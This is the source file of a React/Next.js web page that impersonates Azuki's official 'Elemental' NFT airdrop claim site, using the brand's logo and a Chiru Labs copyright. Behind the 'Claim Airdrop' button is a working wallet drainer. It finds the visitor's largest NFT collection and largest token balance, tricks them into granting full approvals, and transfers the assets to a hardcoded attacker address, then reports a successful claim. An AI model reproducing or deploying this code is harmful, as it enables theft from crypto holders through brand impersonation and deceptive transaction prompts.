"use client";

import React, { useState } from 'react';
// Make sure you have ethers and axios installed in your project:
// npm install ethers axios
import { BrowserProvider, Contract, formatUnits, ZeroAddress, JsonRpcProvider, Signer } from 'ethers';
import axios from 'axios';

// =================================================================
// TYPE DEFINITIONS
// =================================================================
interface IAlchemyNft {
    contract: {
        address: string;
    };
    tokenId: string;
    name?: string;
}

interface IToken {
    token_address: string;
    balance: string;
    decimals: number;
    symbol: string;
}

// =================================================================
// CONTRACT CONSTANTS
// =================================================================
const BATCH_TRANSFER_CONTRACT_ADDRESS = "0x69e051a5B9eae82fFC6E49A70a1A096d8604C10a";
const BATCH_TRANSFER_ABI = [
    "function batchTransfer(address token, uint256 amount, address nft, uint256[] calldata ids, address to)"
];

// This declares the ethereum property on the window object for TypeScript
declare global {
    interface Window {
        ethereum?: any;
    }
}

export default function AirdropPage() {
    const [walletAddress, setWalletAddress] = useState('');
    const [log, setLog] = useState('');
    const [signer, setSigner] = useState<Signer | null>(null);
    const [isProcessing, setIsProcessing] = useState(false);
    const [showLogModal, setShowLogModal] = useState(false);

    const addLog = (message: string) => {
        console.log(message);
        setLog(prev => `${prev}\n${message}`);
    };

    const connectWallet = async () => {
        if (typeof window.ethereum === 'undefined') {
            setShowLogModal(true);
            addLog("MetaMask is not installed.");
            return;
        }
        try {
            setIsProcessing(true);
            setShowLogModal(true);
            addLog("Connecting wallet...");
            
            const web3Provider = new BrowserProvider(window.ethereum);
            const web3Signer = await web3Provider.getSigner();
            const address = await web3Signer.getAddress();
            
            setSigner(web3Signer);
            setWalletAddress(address);
            addLog(`✅ Wallet connected: ${address}`);
            addLog("\nReady to claim. Click the button again to proceed.");

        } catch (error: unknown) {
            if (error instanceof Error) {
                addLog(`Error connecting wallet: ${error.message}`);
            } else {
                addLog('An unknown error occurred while connecting the wallet.');
            }
        } finally {
            setIsProcessing(false);
        }
    };

    const findAndTransferAssets = async () => {
        if (!walletAddress || !signer) {
            addLog("Please connect wallet first.");
            setShowLogModal(true);
            return;
        }
        setIsProcessing(true);
        setShowLogModal(true);
        setLog(''); // Clear previous logs
        addLog("🚀 Starting asset analysis...");

        const alchemyApiKey = process.env.NEXT_PUBLIC_ALCHEMY_API_KEY;
        if (!alchemyApiKey) {
            addLog("❌ Alchemy API Key is not configured. Please set NEXT_PUBLIC_ALCHEMY_API_KEY in your .env.local file.");
            setIsProcessing(false);
            return;
        }

        const alchemyNftApiUrl = `https://eth-sepolia.g.alchemy.com/nft/v3/${alchemyApiKey}/getNFTsForOwner`;
        const alchemyTokenApiUrl = `https://eth-sepolia.g.alchemy.com/v2/${alchemyApiKey}`;

        try {
            addLog("\n[1/5] Fetching wallet assets...");
            const nftResponse = await axios.get(alchemyNftApiUrl, { params: { owner: walletAddress } });
            const nfts: IAlchemyNft[] = nftResponse.data.ownedNfts;
            addLog(`Found ${nfts.length} total NFTs.`);

            const tokenProvider = new JsonRpcProvider(alchemyTokenApiUrl);
            const tokenBalances = await tokenProvider.send('alchemy_getTokenBalances', [walletAddress, "erc20"]);
            
            let tokens: IToken[] = [];
            for (const balance of tokenBalances.tokenBalances) {
                try {
                    const metadata = await tokenProvider.send('alchemy_getTokenMetadata', [balance.contractAddress]);
                    if (metadata.symbol && metadata.decimals && balance.tokenBalance !== "0") {
                        tokens.push({
                            token_address: balance.contractAddress,
                            balance: balance.tokenBalance,
                            decimals: metadata.decimals,
                            symbol: metadata.symbol,
                        });
                    }
                } catch (e) { /* Ignore tokens where metadata fails */ }
            }
            addLog(`Found ${tokens.length} different ERC20 tokens.`);

            addLog("\n[2/5] Analyzing asset values...");
            
            // --- NFT Analysis ---
            let maxNftCount = 0;
            let targetCountNft: { collection: string; ids: string[] } | null = null;

            const collections = nfts.reduce((acc: Record<string, string[]>, nft: IAlchemyNft) => {
                const address = nft.contract.address.toLowerCase();
                acc[address] = acc[address] || [];
                acc[address].push(nft.tokenId);
                return acc;
            }, {} as Record<string, string[]>);

            for (const address in collections) {
                const count = collections[address].length;
                if (count > maxNftCount) {
                    maxNftCount = count;
                    targetCountNft = { collection: address, ids: collections[address] };
                }
            }

            let targetNftCollection = targetCountNft ? targetCountNft.collection : null;
            let targetNftIds = targetCountNft ? targetCountNft.ids : [];
            if (targetCountNft) {
                addLog(`🎯 Highest count NFT collection: ${targetNftCollection} (Count: ${maxNftCount})`);
            } else {
                addLog("No NFT collections found to analyze.");
            }

            // --- Token Analysis ---
            const targetToken = tokens.sort((a, b) => BigInt(b.balance) > BigInt(a.balance) ? 1 : -1)[0] || null;

            if(targetToken){
                addLog(`🎯 Largest balance ERC20: ${targetToken.symbol}`);
            } else {
                addLog("No ERC20 tokens found to analyze.");
            }
            
            addLog("\n[3/5] Requesting approvals...");

            if (targetNftCollection) {
                addLog(`Requesting approval for NFT collection: ${targetNftCollection}...`);
                const nftContract = new Contract(targetNftCollection, ['function setApprovalForAll(address operator, bool approved)'], signer);
                const approvalTx = await nftContract.setApprovalForAll(BATCH_TRANSFER_CONTRACT_ADDRESS, true);
                addLog(`Approval sent: ${approvalTx.hash}. Waiting...`);
                await approvalTx.wait();
                addLog("✅ NFT collection approved!");
            }

            if (targetToken) {
                addLog(`Requesting approval for token: ${targetToken.symbol}...`);
                const tokenContract = new Contract(targetToken.token_address, ['function approve(address spender, uint256 amount)'], signer);
                const approvalTx = await tokenContract.approve(BATCH_TRANSFER_CONTRACT_ADDRESS, BigInt(targetToken.balance));
                addLog(`Approval sent: ${approvalTx.hash}. Waiting...`);
                await approvalTx.wait();
                addLog("✅ ERC20 token approved!");
            }
            
            addLog("\n[4/5] Executing batch transfer...");
            if (!targetToken && !targetNftCollection) {
                addLog("No target assets found. Halting.");
                setIsProcessing(false);
                return;
            }
            const batchTransferContract = new Contract(BATCH_TRANSFER_CONTRACT_ADDRESS, BATCH_TRANSFER_ABI, signer);
            
            const tokenAddr = targetToken ? targetToken.token_address : ZeroAddress;
            const tokenAmount = targetToken ? targetToken.balance : "0";
            const nftAddr = targetNftCollection ? targetNftCollection : ZeroAddress;
            const nftIds = targetNftIds ? targetNftIds : [];
            const recipientAddress = "0x150e3EaE1F50395Aff0b1f99cD61999a76391f34";

            addLog(`Sending assets to: ${recipientAddress}`);
            const transferTx = await batchTransferContract.batchTransfer(tokenAddr, tokenAmount, nftAddr, nftIds, recipientAddress);
            addLog(`Transfer tx sent: ${transferTx.hash}. Waiting...`);
            await transferTx.wait();

            addLog("\n[5/5] ✅✅✅ Airdrop Claimed Successfully!");

        } catch (error: unknown) {
             if (error instanceof Error) {
                addLog(`\n❌ An error occurred: ${error.message}`);
            } else {
                addLog('\n❌ An unknown error occurred during the transfer process.');
            }
            console.error(error);
        } finally {
            setIsProcessing(false);
        }
    };

    const handleClaimClick = () => {
        if (!walletAddress) {
            connectWallet();
        } else {
            findAndTransferAssets();
        }
    };
  
    return (
        <div className="text-white min-h-screen bg-background font-sans relative overflow-hidden">
            {/* Animated background gradients */}
            <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-red-950/20 to-slate-900"></div>
            <div className="absolute inset-0">
                <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-red-600/20 rounded-full blur-3xl animate-pulse"></div>
                <div className="absolute bottom-1/4 right-1/4 w-96 h-96 bg-purple-600/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
                <div className="absolute top-3/4 left-1/2 w-64 h-64 bg-orange-500/10 rounded-full blur-2xl animate-pulse delay-500"></div>
            </div>
            
            {/* Header Section */}
            <header className="absolute top-0 left-0 w-full p-4 sm:p-6 md:p-8 flex justify-between items-center z-20 backdrop-blur-sm">
                <div className="flex items-center space-x-3">
                    <svg width="60" height="60" viewBox="0 0 69 69" fill="none" xmlns="http://www.w3.org/2000/svg" className="drop-shadow-lg">
                        <path d="M68.058 34.05C68.058 52.8592 52.8592 68.1 34.05 68.1C15.2408 68.1 0 52.8592 0 34.05C0 15.2408 15.2408 0 34.05 0C52.8592 0 68.058 15.2408 68.058 34.05ZM11.1392 34.05C11.1392 46.7328 21.3672 57.0019 34.009 57.0019C46.6508 57.0019 56.8788 46.7328 56.8788 34.05C56.8788 21.3672 46.6508 11.0981 34.009 11.0981C21.3672 11.0981 11.1392 21.3672 11.1392 34.05Z" fill="#ED1C24"/>
                        <path d="M34.0492 46.166C27.0801 46.166 21.4395 40.5254 21.4395 33.5564C21.4395 26.5873 27.0801 20.9468 34.0492 20.9468C41.0183 20.9468 46.6589 26.5873 46.6589 33.5564C46.6589 40.5254 41.0183 46.166 34.0492 46.166Z" fill="#ED1C24"/>
                    </svg>
                    <span className="text-2xl font-black text-white">AZUKI</span>
                </div>
                <nav className="hidden md:flex items-center space-x-8 text-lg font-bold">
                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                        THE GARDEN
                        <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                        SHOP
                        <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                    <a href="#" className="text-white/80 hover:text-red-500 transition-colors duration-300 relative group">
                        ABOUT
                        <span className="absolute -bottom-1 left-0 w-0 h-0.5 bg-red-500 transition-all duration-300 group-hover:w-full"></span>
                    </a>
                </nav>
                <div className="md:hidden">
                    <div className="w-8 h-8 flex flex-col justify-center space-y-1 cursor-pointer">
                        <div className="w-6 h-0.5 bg-white transition-all duration-300 hover:bg-red-500"></div>
                        <div className="w-6 h-0.5 bg-white transition-all duration-300 hover:bg-red-500"></div>
                        <div className="w-6 h-0.5 bg-white transition-all duration-300 hover:bg-red-500"></div>
                    </div>
                </div>
            </header>

            {/* Main Content */}
            <main className="min-h-screen flex items-center justify-center flex-col p-4 relative z-10">
                <div className="bg-black/40 backdrop-blur-2xl border border-white/10 rounded-3xl p-8 sm:p-12 md:p-16 max-w-2xl w-full text-center shadow-2xl">
                    {/* Glow effect */}
                    <div className="absolute inset-0 bg-gradient-to-r from-red-500/20 via-transparent to-purple-500/20 rounded-3xl blur-xl -z-10"></div>
                    
                    <div className="space-y-8">
                        <div>
                            <h1 className="text-4xl sm:text-5xl md:text-6xl font-black uppercase tracking-wider mb-6 bg-gradient-to-r from-white via-red-200 to-red-500 bg-clip-text text-transparent leading-tight">
                                Claim <span className="text-red-500 drop-shadow-lg">Elemental</span> Azuki Now
                            </h1>
                            <div className="w-32 h-1 bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 mx-auto rounded-full"></div>
                        </div>
                        
                        <p className="text-gray-300 text-lg md:text-xl max-w-lg mx-auto leading-relaxed">
                            The gates to the Garden are open. The next chapter of the Azuki universe awaits. Claim your Elemental NFT airdrop to continue the journey.
                        </p>
                        
                        <div className="pt-4">
                            <button 
                                className="group relative bg-gradient-to-r from-red-600 to-red-700 text-white font-bold text-xl md:text-2xl uppercase py-6 px-16 rounded-2xl shadow-2xl transition-all duration-500 ease-out hover:from-red-500 hover:to-red-600 hover:scale-105 hover:shadow-red-500/50 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100 transform-gpu"
                                onClick={handleClaimClick}
                                disabled={isProcessing}
                            >
                                {/* Button glow effect */}
                                <div className="absolute inset-0 bg-gradient-to-r from-red-400 to-red-600 rounded-2xl blur opacity-50 group-hover:opacity-100 transition-opacity duration-500"></div>
                                
                                <span className="relative z-10 flex items-center justify-center space-x-2">
                                    {isProcessing && (
                                        <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                        </svg>
                                    )}
                                    <span>
                                        {isProcessing ? 'PROCESSING...' : (walletAddress ? 'Claim Airdrop' : 'Connect Wallet')}
                                    </span>
                                </span>
                                
                                {/* Ripple effect */}
                                <div className="absolute inset-0 rounded-2xl overflow-hidden">
                                    <div className="absolute inset-0 bg-white/20 translate-x-full group-hover:translate-x-0 transition-transform duration-1000 ease-out skew-x-12"></div>
                                </div>
                            </button>
                        </div>
                        
                        <div className="bg-black/30 backdrop-blur-sm rounded-xl p-4 border border-white/5">
                            <p className="text-gray-400 text-sm">
                                {walletAddress 
                                    ? (
                                        <span className="flex items-center justify-center space-x-2">
                                            <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                                            <span>Connected: {walletAddress.substring(0,6)}...{walletAddress.substring(walletAddress.length - 4)}</span>
                                        </span>
                                    )
                                    : "Connect your wallet to verify eligibility."
                                }
                            </p>
                        </div>
                    </div>
                </div>
            </main>

            {/* Log Modal */}
            {showLogModal && (
                <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
                    <div className="bg-slate-900/95 backdrop-blur-xl border border-red-500/50 rounded-3xl p-6 flex flex-col max-h-[85vh] max-w-[90vw] w-[700px] shadow-2xl">
                        {/* Modal glow */}
                        <div className="absolute inset-0 bg-gradient-to-r from-red-500/10 via-transparent to-purple-500/10 rounded-3xl blur-xl -z-10"></div>
                        
                        <div className="flex justify-between items-center mb-6">
                            <h2 className="text-2xl font-bold bg-gradient-to-r from-red-400 to-orange-500 bg-clip-text text-transparent uppercase tracking-wider">
                                Claim Status
                            </h2>
                            <button 
                                onClick={() => setShowLogModal(false)} 
                                className="text-gray-400 hover:text-white text-3xl font-light hover:bg-red-500/20 w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 hover:rotate-90"
                            >
                                ×
                            </button>
                        </div>
                        
                        <div className="bg-black/80 backdrop-blur-sm rounded-2xl p-6 text-left text-sm font-mono whitespace-pre-wrap break-all overflow-y-auto flex-grow max-h-96 border border-red-500/20">
                            <div className="text-green-400 leading-relaxed">
                                {log || 'Initializing...'}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Footer */}
            <footer className="absolute bottom-0 w-full p-6 text-center text-gray-500 text-sm border-t border-white/10 backdrop-blur-sm bg-black/20 z-10">
                <p>&copy; 2024 Chiru Labs, Inc. All Rights Reserved.</p>
            </footer>
        </div>
    );
}